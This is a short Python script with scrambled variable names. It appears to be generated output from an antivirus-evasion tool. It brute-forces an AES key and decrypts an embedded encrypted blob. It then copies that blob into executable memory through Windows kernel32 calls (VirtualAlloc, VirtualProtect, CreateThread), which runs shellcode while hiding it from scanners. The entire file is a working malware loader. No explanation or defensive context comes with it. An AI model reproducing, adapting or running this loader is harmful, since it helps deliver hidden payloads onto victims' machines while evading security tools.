import ctypes as LHLTIKjbufMkm
from Crypto.Cipher import AES
import base64
import os
ukyIAbzURhfuCwm = 'dI6|kMQ{c&Daxk.}x5{sI4n}O'
tKDRVIofZnx = '*'
for VpxTHzqSTV in range(1000000, 10000000):
	kGzPnuZcH = "dI6|kMQ{c&Daxk.}x5{sI4n}O" + str(VpxTHzqSTV)
	fsOqLLVBgBQcQ = AES.new(kGzPnuZcH, AES.MODE_ECB)
	LJNufLaEfLu = base64.b64decode('JpqGyis7Un29d+J/Gm9qPA==')
	try:
		CuIeXRHKW = fsOqLLVBgBQcQ.decrypt(LJNufLaEfLu).decode('ascii')
		if CuIeXRHKW.rstrip('*') == 'MOLWqufq':
			NXjXuyZmzivM = base64.b64decode('Ssy3vGsBrIctv6WUdbvxK4O7az/Q+rPhovuDOsk7qpna3FUKpxW42vEp11eM0vKQPiVwqbJrUeCni0vy2A4cMRa7R/+U4DpKnX4wSpWy5FQC78ln+tT6wgQ5hCVK7Ws229l6l/vmeHZNRj/YA3fbvsYo6emewKZRcNL3ersz8twMwYNR9cOd+/R3629wUJgJV64SHhtzTjgXTwDrA4nUQktHXbZHX7ZEErCkPidRpY23id5TJftWM1+c9VFUuNPj+LjRaCuPskjSrkmX2XduUxDluO5Q7o1R34E8tKSpQwX5qlnKgz7V5eIYijV314hGVF8DJ8fV15yxkhrxTLwbUvXucWYHFbnHtqcXqVJoPGB04PgPwyXbfgeYlF8u4sLxVSm3Yu6G/Z1PVr87IeEWlkWO2bhotrnaxSGQa3cqkAtXpYIS+V8Z9gn1HbezN9ft')
			FtPsDJmtGCEn = fsOqLLVBgBQcQ.decrypt(NXjXuyZmzivM)
			QFlvUjqUHZX = LHLTIKjbufMkm.windll.kernel32.VirtualAlloc(LHLTIKjbufMkm.c_int(0),LHLTIKjbufMkm.c_int(len(FtPsDJmtGCEn)),LHLTIKjbufMkm.c_int(0x3000),LHLTIKjbufMkm.c_int(0x04))
			LHLTIKjbufMkm.windll.kernel32.RtlMoveMemory(LHLTIKjbufMkm.c_int(QFlvUjqUHZX),FtPsDJmtGCEn,LHLTIKjbufMkm.c_int(len(FtPsDJmtGCEn)))
			IEprOUmJMr = LHLTIKjbufMkm.windll.kernel32.VirtualProtect(LHLTIKjbufMkm.c_int(QFlvUjqUHZX),LHLTIKjbufMkm.c_int(len(FtPsDJmtGCEn)),LHLTIKjbufMkm.c_int(0x20),LHLTIKjbufMkm.byref(LHLTIKjbufMkm.c_uint32(0)))
			XAxzurdAaD = LHLTIKjbufMkm.windll.kernel32.CreateThread(LHLTIKjbufMkm.c_int(0),LHLTIKjbufMkm.c_int(0),LHLTIKjbufMkm.c_int(QFlvUjqUHZX),LHLTIKjbufMkm.c_int(0),LHLTIKjbufMkm.c_int(0),LHLTIKjbufMkm.pointer(LHLTIKjbufMkm.c_int(0)))
			LHLTIKjbufMkm.windll.kernel32.WaitForSingleObject(LHLTIKjbufMkm.c_int(XAxzurdAaD),LHLTIKjbufMkm.c_int(-1))
	except:
		pass